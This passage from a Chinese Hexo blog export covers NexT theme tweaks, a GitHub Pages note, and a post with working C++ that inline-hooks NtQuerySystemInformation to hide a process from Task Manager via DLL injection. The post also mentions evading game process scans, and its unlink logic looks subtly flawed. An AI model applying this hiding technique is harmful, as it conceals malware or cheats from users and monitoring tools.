<li>文章<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  #文章内是否显示</span><br><span class="line">  symbols: true</span><br><span class="line">  time: false</span><br><span class="line">  #网页底部是否显示</span><br><span class="line">  total_symbols: true</span><br><span class="line">  total_time: false</span><br><span class="line">  exclude_codeblock: false</span><br><span class="line">  awl: 4</span><br><span class="line">  wpm: 275</span><br><span class="line">  suffix: &#x27;mins.&#x27;</span><br></pre></td></tr></table></figure></li>
<li>看板娘<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">live2d:</span><br><span class="line">  enable: false</span><br><span class="line">  scriptFrom: local</span><br><span class="line">  pluginRootPath: live2dw/</span><br><span class="line">  pluginJsPath: lib/</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  tagMode: false</span><br><span class="line">  log: false</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-model-hijiki</span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: 150</span><br><span class="line">    height: 300</span><br><span class="line">  mobile:</span><br><span class="line">    show: false</span><br></pre></td></tr></table></figure></li>
<li>模型自已下载即可</li>
</ul>
<h2 id="文章置顶功能"><a href="#文章置顶功能" class="headerlink" title="文章置顶功能"></a>文章置顶功能</h2><ul>
<li>先卸载旧版本</li>
<li>npm uninstall –save hexo-generator-index</li>
<li>后安装新版本</li>
<li>npm install –save hexo-generator-index-pin-top</li>
<li>修改置顶字体颜色 搜索置顶即可找到位置</li>
<li>next&#x2F;layout&#x2F;_macro&#x2F;post.swig      </li>
<li>之后修改这些代码<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;post-meta&quot;&gt;</span><br><span class="line">&#123;% if post.top %&#125;</span><br><span class="line">#字体图标</span><br><span class="line">&lt;i class=&quot;fas fa-star&quot;&gt;&lt;/i&gt; </span><br><span class="line">&lt;font color=#000&gt;置顶&lt;/font&gt;</span><br><span class="line">&lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></li>
<li>其中字体文件在 \next\source\lib\font-awesome 这个路径 </li>
<li>打开这个文件 \next\source\lib\font-awesome\css\all.min.css</li>
<li>可以查看 fontawesome的版本 可以去官网找图标修改</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="主题总结："><a href="#主题总结：" class="headerlink" title="主题总结："></a>主题总结：</h2><ul>
<li>其他问题可以点击侧边栏的联系我 以便咨询问题 懒病犯了 不想写了 大部分修改网上都可以找到解决方案哦~</li>
</ul>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>主题美化</tag>
        <tag>超链接修改</tag>
        <tag>NEXT主题遇到的坑</tag>
      </tags>
  </entry>
  <entry>
    <title>HOOKNTQuerySystemInformation实现隐藏进程</title>
    <url>/posts/d12daf98/</url>
    <content><![CDATA[<h1 id="HOOK-NTQuerySystemInformation-实现隐藏进程"><a href="#HOOK-NTQuerySystemInformation-实现隐藏进程" class="headerlink" title="HOOK NTQuerySystemInformation 实现隐藏进程"></a>HOOK NTQuerySystemInformation 实现隐藏进程</h1><h2 id="这个起始就是一个断链隐藏-而且很麻烦-没有什么特别之处-最多当学习HOOK了吧-但是可以通过这个项目搞一搞HOOK-进程快照函数-叫啥忘了-某些Game会调用嗷"><a href="#这个起始就是一个断链隐藏-而且很麻烦-没有什么特别之处-最多当学习HOOK了吧-但是可以通过这个项目搞一搞HOOK-进程快照函数-叫啥忘了-某些Game会调用嗷" class="headerlink" title="这个起始就是一个断链隐藏 而且很麻烦 没有什么特别之处 最多当学习HOOK了吧 但是可以通过这个项目搞一搞HOOK 进程快照函数 叫啥忘了 某些Game会调用嗷~"></a>这个起始就是一个断链隐藏 而且很麻烦 没有什么特别之处 最多当学习HOOK了吧 但是可以通过这个项目搞一搞HOOK 进程快照函数 叫啥忘了 某些Game会调用嗷~</h2><h2 id="先放代码："><a href="#先放代码：" class="headerlink" title="先放代码："></a>先放代码：</h2><span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &quot;fun.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">enum SYSTEM_INFORMATION_CLASS</span><br><span class="line">&#123;</span><br><span class="line">	SystemProcessInformation = 5</span><br><span class="line">&#125;;</span><br><span class="line">typedef struct _UNICODE_STRING &#123;</span><br><span class="line">	USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	PWSTR  Buffer;</span><br><span class="line">&#125; UNICODE_STRING;</span><br><span class="line">typedef UNICODE_STRING* PUNICODE_STRING;</span><br><span class="line">typedef const UNICODE_STRING* PCUNICODE_STRING;</span><br><span class="line">typedef LONG KPRIORITY;</span><br><span class="line">typedef struct _CLIENT_ID &#123;</span><br><span class="line">	HANDLE UniqueProcess;</span><br><span class="line">	HANDLE UniqueThread;</span><br><span class="line">&#125; CLIENT_ID;</span><br><span class="line">typedef struct _SYSTEM_PROCESS_INFORMATION &#123;</span><br><span class="line">	ULONG NextEntryOffset;//链表头</span><br><span class="line">	ULONG NumberOfThreads;//进程中的线程数。</span><br><span class="line">	BYTE Reserved1[48];</span><br><span class="line">	UNICODE_STRING ImageName;//进程的图像名称</span><br><span class="line">	KPRIORITY BasePriority;//进程中创建的线程的启动优先级</span><br><span class="line">	HANDLE UniqueProcessId;//包含进程的唯一进程 ID</span><br><span class="line">	PVOID Reserved2;</span><br><span class="line">	ULONG HandleCount;//进程正在使用的句柄总数</span><br><span class="line">	ULONG SessionId;//进程会话的会话标识符</span><br><span class="line">	PVOID Reserved3;</span><br><span class="line">	SIZE_T PeakVirtualSize;//虚拟内存的峰值大小（以字节为单位）</span><br><span class="line">	SIZE_T VirtualSize;//虚拟内存的当前大小（以字节为单位）</span><br><span class="line">	ULONG Reserved4;</span><br><span class="line">	SIZE_T PeakWorkingSetSize;//进程工作集的峰值大小（以千字节为单位）</span><br><span class="line">	SIZE_T WorkingSetSize;</span><br><span class="line">	PVOID Reserved5;</span><br><span class="line">	SIZE_T QuotaPagedPoolUsage;//进程收取的分页池使用的当前配额</span><br><span class="line">	PVOID Reserved6;</span><br><span class="line">	SIZE_T QuotaNonPagedPoolUsage;//进程收取的非分页池使用的当前配额</span><br><span class="line">	SIZE_T PagefileUsage;//页面文件存储的字节数</span><br><span class="line">	SIZE_T PeakPagefileUsage;//页面文件存储的最大字节数</span><br><span class="line">	SIZE_T PrivatePageCount;//进程使用的内存页数</span><br><span class="line">	LARGE_INTEGER Reserved7[6];</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;</span><br><span class="line">typedef struct _SYSTEM_THREAD_INFORMATION &#123;</span><br><span class="line">	LARGE_INTEGER KernelTime;</span><br><span class="line">	LARGE_INTEGER UserTime;</span><br><span class="line">	LARGE_INTEGER CreateTime;</span><br><span class="line">	ULONG WaitTime;</span><br><span class="line">	PVOID StartAddress;</span><br><span class="line">	CLIENT_ID ClientId;</span><br><span class="line">	LONG Priority;</span><br><span class="line">	LONG BasePriority;</span><br><span class="line">	ULONG ContextSwitches;</span><br><span class="line">	ULONG ThreadState;</span><br><span class="line">	ULONG WaitReason;</span><br><span class="line">&#125; SYSTEM_THREAD_INFORMATION,</span><br><span class="line">* PSYSTEM_THREAD_INFORMATION;</span><br><span class="line">typedef  NTSTATUS(WINAPI* MyNtQuerySystemInformation)(</span><br><span class="line">	SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="line">	PVOID                    SystemInformation,</span><br><span class="line">	ULONG                    SystemInformationLength,</span><br><span class="line">	PULONG                   ReturnLength</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">BYTE dwbuff[5]&#123;&#125;, buffer[5]&#123; 0xE9, &#125;;//jmp</span><br><span class="line">FARPROC NtQSInfo;</span><br><span class="line">NTSTATUS WINAPI NewNtQuerySystemInformation(</span><br><span class="line">	SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="line">	PVOID                    SystemInformation,</span><br><span class="line">	ULONG                    SystemInformationLength,</span><br><span class="line">	PULONG                   ReturnLength);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void hook() &#123;</span><br><span class="line">	NtQSInfo = GetProcAddress(GetModuleHandle(TEXT(&quot;ntdll.dll&quot;)), &quot;NtQuerySystemInformation&quot;);</span><br><span class="line">	if (!NtQSInfo)</span><br><span class="line">		return ;</span><br><span class="line">	DWORD OldProtect = 0;</span><br><span class="line">	//硬编码地址 = 要跳转的目标地址 - 指令的地址 - 5（指令的长度）</span><br><span class="line">	DWORD Funtion = (DWORD)&amp;NewNtQuerySystemInformation - (DWORD)NtQSInfo - 5;</span><br><span class="line">	memcpy(&amp;buffer[1], &amp;Funtion, 4);//拷贝字节</span><br><span class="line">	VirtualProtect(NtQSInfo, 5, PAGE_EXECUTE_READWRITE, &amp;OldProtect);//取消内存保护</span><br><span class="line">	memcpy(dwbuff, NtQSInfo, 5);//保存原字节</span><br><span class="line">	memcpy(NtQSInfo, buffer, 5);//写入hook</span><br><span class="line">	VirtualProtect(NtQSInfo, 5, OldProtect, &amp;OldProtect);//恢复保护</span><br><span class="line">&#125;</span><br><span class="line">void unhook() &#123;</span><br><span class="line">	DWORD OldProtect = 0;</span><br><span class="line">	VirtualProtect(NtQSInfo, 5, PAGE_EXECUTE_READWRITE, &amp;OldProtect);//取消内存保护</span><br><span class="line">	PBYTE Temp = (PBYTE)NtQSInfo;</span><br><span class="line">	if (Temp[0] == 0xE9)</span><br><span class="line">		memcpy(NtQSInfo, dwbuff, 5);//卸载hook</span><br><span class="line">	VirtualProtect(NtQSInfo, 5, OldProtect, &amp;OldProtect);//恢复保护</span><br><span class="line">&#125;</span><br><span class="line">NTSTATUS WINAPI NewNtQuerySystemInformation(</span><br><span class="line">	SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="line">	PVOID                    SystemInformation,</span><br><span class="line">	ULONG                    SystemInformationLength,</span><br><span class="line">	PULONG                   ReturnLength)</span><br><span class="line">&#123;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	FARPROC pFunc;</span><br><span class="line">	PSYSTEM_PROCESS_INFORMATION pCur, pPrev = NULL;</span><br><span class="line">	unhook();</span><br><span class="line">	MyNtQuerySystemInformation NtQuerySystemInformation = NULL;</span><br><span class="line">	NtQuerySystemInformation = (MyNtQuerySystemInformation)NtQSInfo;</span><br><span class="line">	status = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);</span><br><span class="line">	if (status != 0)</span><br><span class="line">		goto END;</span><br><span class="line">	if (SystemInformationClass == SystemProcessInformation)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwPID = GetCurrentProcessId();</span><br><span class="line">		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;</span><br><span class="line">		while (true)</span><br><span class="line">		&#123;</span><br><span class="line">			if ((DWORD)pCur-&gt;UniqueProcessId == dwPID)</span><br><span class="line">			&#123;</span><br><span class="line">				if (pCur-&gt;NextEntryOffset == 0)</span><br><span class="line">					pPrev-&gt;NextEntryOffset = 0;</span><br><span class="line">				else</span><br><span class="line">					pPrev-&gt;NextEntryOffset += pPrev-&gt;NextEntryOffset;</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				pPrev = pCur;</span><br><span class="line">			&#125;</span><br><span class="line">			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur-&gt;NextEntryOffset);</span><br><span class="line">			if (pCur-&gt;NextEntryOffset == 0)</span><br><span class="line">				break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">END:</span><br><span class="line">	hook();</span><br><span class="line">	return status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="项目原理"><a href="#项目原理" class="headerlink" title="项目原理"></a>项目原理</h2><ul>
<li>拦截到该函数的参数(这个函数名字太长 以下统称该函数) 修改值之后返回即可 </li>
<li>注意 最好写成DLL的方式 不然会很麻烦 而且需要注入到任务管理器 普通线程注入即可 若要注入一些 系统会话为0 || 高权限进程 恐怕线程注入无法达到目的</li>
</ul>
<h2 id="项目实现"><a href="#项目实现" class="headerlink" title="项目实现"></a>项目实现</h2><ul>
<li>获取该函数的函数地址 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GetMo</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>WinAPI编程</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>逆向</tag>
        <tag>隐藏进程</tag>
      </tags>
  </entry>
  <entry>
    <title>使用GithubPages创建自已的博客包含域名修改</title>
    <url>/posts/42e9c570/</url>
    <content><![CDATA[<h1 id="使用Github-Pages创建自已的网站包含域名修改"><a href="#使用Github-Pages创建自已的网站包含域名修改" class="headerlink" title="使用Github Pages创建自已的网站包含域名修改"></a>使用Github Pages创建自已的网站包含域名修改</h1><ul>
<li>之前的笔记了 请看思维导图</li>
<li>建议下载之后观看<span id="more"></span></li>
</ul>
<h1 id="思维导图图片："><a href="#思维导图图片：" class="headerlink" title="思维导图图片："></a>思维导图图片：</h1><p><img src="/images/xmind/%E4%BD%BF%E7%94%A8GithubPages%E5%88%9B%E5%BB%BA%E8%87%AA%E5%B7%B2%E7%9A%84%E7%BD%91%E7%AB%99%E5%8C%85%E5%90%AB%E5%9F%9F%E5%90%8D%E4%BF%AE%E6%94%B9.png" alt="思维导图"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>图片在该网址看的还是太费劲 直接下载下来吧 因为字数很多 </li>
<li>这是我刚搭建好的时候记录的 也是东凑西凑的 反正也整好了 </li>
<li>自我感觉挺详细 如果有问题欢迎随时找我答疑 能教的我都会教 不能教的就是我不会的了</li>
</ul>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
</search>
